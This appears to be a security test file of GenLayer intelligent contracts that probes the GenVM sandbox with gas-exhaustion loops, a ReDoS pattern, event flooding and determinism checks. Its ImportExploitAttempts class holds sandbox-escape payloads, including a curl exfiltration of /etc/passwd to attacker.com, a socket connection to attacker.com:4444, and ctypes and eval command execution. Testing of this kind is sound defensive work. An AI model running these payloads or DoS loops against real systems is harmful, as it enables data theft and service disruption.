# {"Depends": "py-genlayer:test"}
"""
ATTACK VECTOR 6: GenVM Execution & Sandbox Attacks
====================================================
Target: GenVM sandbox, bootloader, gas metering, deterministic execution

Threat Model:
  Attacker attempts to escape the GenVM sandbox, exploit the bootloader's
  method resolution, exhaust resources, or break determinism guarantees.

Scenarios:
  A) Gas exhaustion via computational bombs
  B) Import/module exploitation (attempting to import dangerous modules)
  C) Floating-point non-determinism exploitation
  D) Pickle deserialization attacks (SANDBOX entry point)
  E) Storage slot manipulation
  F) Event system abuse
"""

from genlayer import *


# ============================================================================
# ATTACK A: Gas Exhaustion via Computational Bombs
# ============================================================================
class GasExhaustionAttacks(gl.Contract):
    """
    Attempts to exhaust gas/compute resources to DoS the network.
    Each method tests a different resource exhaustion vector.
    """
    data: TreeMap[str, str]

    @gl.public.write
    def exponential_storage(self, depth: u256):
        """
        Exponential storage write: attempts to write 2^depth entries.
        Even depth=30 would attempt ~1 billion writes.
        """
        # Attack: exponential loop
        count = u256(1)
        for _ in range(int(depth)):
            count = count * u256(2)

        for i in range(int(count)):
            self.data[str(i)] = "x" * 1000

    @gl.public.write
    def recursive_bomb(self, depth: u256):
        """
        Deep recursion to exhaust stack space.
        """
        if depth > u256(0):
            # Each level allocates a large string
            _ = "A" * 10000
            self.recursive_bomb(depth - u256(1))

    @gl.public.write
    def hash_bomb(self):
        """
        Compute-intensive hashing loop.
        """
        data = b"seed"
        for _ in range(1000000):
            data = gl.Keccak256(data).digest()

    @gl.public.view
    def regex_bomb(self, input_str: str) -> str:
        """
        ReDoS: Crafted input that causes catastrophic regex backtracking.
        Tested if GenVM exposes regex functionality.
        """
        # If Python's re module is available in GenVM
        import re
        # Vulnerable pattern with nested quantifiers
        pattern = r"(a+)+b"
        # Attack input: "aaaaaaaaaaaaaaaaaaaaaaaa!" causes exponential backtracking
        return str(bool(re.match(pattern, input_str)))


class GasProtectedContract(gl.Contract):
    """
    Defense: Input bounds, iteration limits, depth limits.
    """
    data: TreeMap[str, str]
    MAX_BATCH_SIZE: u256

    def __init__(self):
        self.MAX_BATCH_SIZE = u256(100)

    @gl.public.write
    def batch_store(self, entries: u256):
        if entries > self.MAX_BATCH_SIZE:
            raise gl.vm.UserError(f"Batch size exceeds max {self.MAX_BATCH_SIZE}")

        for i in range(int(entries)):
            self.data[str(i)] = "value"


# ============================================================================
# ATTACK B: Import/Module Exploitation
# ============================================================================
class ImportExploitAttempts:
    """
    Tests whether GenVM properly restricts dangerous Python imports.

    These should ALL be blocked by the GenVM sandbox. If any succeed,
    it's a critical security vulnerability.

    Test cases (to be run as contract code):
    """

    # Attempt 1: OS access
    PAYLOAD_OS = """
import os
os.system("curl attacker.com/exfil?data=$(cat /etc/passwd)")
"""

    # Attempt 2: Subprocess
    PAYLOAD_SUBPROCESS = """
import subprocess
subprocess.run(["cat", "/etc/passwd"], capture_output=True)
"""

    # Attempt 3: Socket (network access outside web.render)
    PAYLOAD_SOCKET = """
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("attacker.com", 4444))
s.send(b"pwned")
"""

    # Attempt 4: File system access
    PAYLOAD_FILE = """
with open("/etc/passwd", "r") as f:
    data = f.read()
"""

    # Attempt 5: ctypes for native code execution
    PAYLOAD_CTYPES = """
import ctypes
libc = ctypes.CDLL("libc.so.6")
libc.system(b"id")
"""

    # Attempt 6: __import__ bypass
    PAYLOAD_IMPORT_BYPASS = """
__builtins__.__import__("os").system("id")
"""

    # Attempt 7: eval/exec code execution
    PAYLOAD_EVAL = """
eval(compile('import os; os.system("id")', '<string>', 'exec'))
"""

    # Attempt 8: Accessing internals via inspect
    PAYLOAD_INSPECT = """
import inspect
frame = inspect.currentframe()
# Walk up frames to access GenVM internals
while frame:
    print(frame.f_locals)
    frame = frame.f_back
"""


# ============================================================================
# ATTACK C: Floating-Point Non-Determinism
# ============================================================================
class FloatingPointExploit(gl.Contract):
    """
    Exploits floating-point precision differences between platforms.

    GenVM uses software-implemented IEEE 754 in deterministic mode,
    but what happens at the boundary between deterministic and
    non-deterministic execution?
    """
    results: DynArray[str]

    @gl.public.write
    def precision_test(self) -> str:
        """
        Test: Does the contract properly handle float operations
        that are known to differ across platforms?
        """
        # These operations are known to produce different results
        # on different CPU architectures with hardware floats
        test_cases = [
            0.1 + 0.2,                    # Classic: != 0.3 on most systems
            2.0 ** 53 + 1,                 # Double precision limit
            1e308 * 2,                     # Infinity edge case
            float("inf") - float("inf"),   # NaN generation
            (-1.0) ** 0.5,                 # Complex number territory
        ]

        results = [str(x) for x in test_cases]
        result_str = "|".join(results)
        self.results.append(result_str)
        return result_str

    @gl.public.write
    def cross_boundary_float(self) -> str:
        """
        Test: What happens when a float computed in non-deterministic
        mode (gl.nondet.exec_prompt) is used in deterministic calculations?
        """
        def nondet_float() -> str:
            return gl.nondet.exec_prompt(
                "Return the number 3.14159265358979323846. "
                "Return ONLY the number, nothing else."
            )

        # Get float from non-deterministic context
        pi_str = gl.eq_principle.strict_eq(nondet_float)

        # Use it in deterministic computation
        pi = float(pi_str)
        area = pi * 100.0 * 100.0  # Area of circle with radius 100

        return str(area)


# ============================================================================
# ATTACK D: Event System Abuse
# ============================================================================
class EventFloodContract(gl.Contract):
    """
    Tests whether the event system can be abused to:
    1. Emit massive numbers of events (log flooding)
    2. Emit events with huge payloads
    3. Emit events that confuse indexers/frontends

    This could DoS event indexers, fill up logs, or cause issues
    for applications monitoring contract events.
    """
    counter: u256

    def __init__(self):
        self.counter = u256(0)

    @gl.public.write
    def emit_flood(self, count: u256):
        """Attempt to emit thousands of events in one transaction."""
        for i in range(int(count)):
            gl.advanced.emit_raw_event(
                f"Flood event #{i}",
                {"index": str(i), "data": "x" * 1000}
            )

    @gl.public.write
    def emit_large(self):
        """Attempt to emit a single massive event."""
        gl.advanced.emit_raw_event(
            "Large event",
            {"payload": "A" * 1000000}  # 1MB payload
        )


# ============================================================================
# ATTACK E: Deterministic Execution Violation Tests
# ============================================================================
class DeterminismTests(gl.Contract):
    """
    Tests that verify GenVM maintains determinism guarantees.
    If any of these produce different results across validators,
    consensus will break - revealing a GenVM bug.
    """

    @gl.public.view
    def test_dict_ordering(self) -> str:
        """Python dict ordering became insertion-ordered in 3.7+.
        Test if GenVM preserves this guarantee."""
        d = {"z": 1, "a": 2, "m": 3}
        return str(list(d.keys()))

    @gl.public.view
    def test_hash_stability(self) -> str:
        """Python's hash() is randomized by default (PYTHONHASHSEED).
        GenVM must fix the seed for determinism."""
        return str(hash("test_string"))

    @gl.public.view
    def test_set_ordering(self) -> str:
        """Sets are unordered in Python. Using sets in deterministic
        code that depends on iteration order would break consensus."""
        s = {3, 1, 4, 1, 5, 9, 2, 6}
        return str(sorted(list(s)))  # sorted() makes it deterministic

    @gl.public.view
    def test_object_id(self) -> str:
        """id() returns memory address which differs across processes."""
        obj = object()
        return str(id(obj))

    @gl.public.view
    def test_global_state(self) -> str:
        """Test if any global/module state leaks between transactions."""
        import sys
        return str(sys.maxsize)
